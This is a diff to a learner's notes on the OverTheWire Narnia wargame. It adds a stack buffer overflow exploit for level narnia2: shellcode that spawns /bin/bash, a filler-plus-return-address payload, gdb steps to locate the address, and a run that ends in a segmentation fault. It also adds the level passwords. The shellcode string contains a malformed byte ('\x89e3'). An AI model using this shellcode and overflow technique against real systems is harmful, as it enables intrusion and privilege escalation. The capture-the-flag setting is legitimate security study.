@@ -89,6 +89,7 @@ export EGG=$(perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6
 ./narnia1
 
 whoami
+-- narnia2
 cat /etc/narnia_pass_narnia2
 
 $$$$$$$$$$$$$$
@@ -119,8 +120,24 @@ int main(int argc, char * argv[]){
 
 -----------------------------------------------------------------------------------------
 
+# Get the lenght of the shellcode
+perl -e 'print length("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89e3\x52\x51\x53\x89\xe1\xcd\x80") . "\n"'
+-- 33
+
+# So 140 - 33 = 107
+# We need a filler of 107 + shellcode + the memory location we are writing to
+# To find out the mem location let's use gdb :)
+
+gdb ./narnia2
+r $(perl -e 'print "a" x 107 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89e3\x52\x51\x53\x89\xe1\xcd\x80" . "c" x 4')
+x/300x $esp
+quit
+
+./narnia2 $(perl -e 'print "a" x 107 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89e3\x52\x51\x53\x89\xe1\xcd\x80" . "\x90\xd8\xff\xff"')
+Segmentation fault (core dumped)
 
 
 ** Passwords **
-narnia0:efeidiedae
-nairiepecu
+narnia0:narnia0
+narnia1:efeidiedae
+narnia2:nairiepecu
